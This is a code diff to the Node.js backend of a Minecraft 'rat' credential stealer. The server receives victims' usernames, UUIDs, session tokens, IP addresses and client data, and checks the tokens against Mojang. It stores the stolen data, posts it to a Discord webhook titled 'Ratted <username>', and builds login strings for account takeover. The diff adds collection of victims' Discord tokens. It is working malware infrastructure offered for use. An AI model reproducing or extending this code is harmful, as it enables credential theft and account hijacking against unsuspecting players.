@@ -29,7 +29,7 @@ if (usingMongoDB) {
 //main route, post to this
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
-    if (!req.body.username || !req.body.uuid || !req.body.token || !req.body.ip || !req.body.feather || !req.body.essentials) return console.log("Invalid post request")
+    if (!req.body.username || !req.body.uuid || !req.body.token || !req.body.ip || !req.body.feather || !req.body.essentials || !req.body.discord) return console.log("Invalid post request")
 
     //validate the token with mojang (should mostly always hit, unless someone sends well formatted json but with bad data)
     post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
@@ -56,7 +56,8 @@ app.post("/", (req, res) => {
                     //(optional) string to login using https://github.com/DxxxxY/TokenAuth
                     tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`,
                     feather: req.body.feather,
-                    essentials: req.body.essentials
+                    essentials: req.body.essentials,
+                    discord: req.body.discord
                 }).save(err => {
                     if (err) console.log(`Error while saving to database\n${err}`)
                 })
@@ -68,7 +69,7 @@ app.post("/", (req, res) => {
                     content: "@everyone", //ping
                     embeds: [{
                         title: `Ratted ${req.body.username} - Click For Stats`,
-                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\`\`\`${req.body.feather}\`\`\`\n**Essentials:**\`\`\`${req.body.essentials}\`\`\``,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\`\`\`${req.body.feather}\`\`\`\n**Essentials:**\`\`\`${req.body.essentials}\`\`\`\n**Discord:**\`\`\`${req.body.discord}\`\`\``,
                         url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         color: 5814783,
                         footer: {
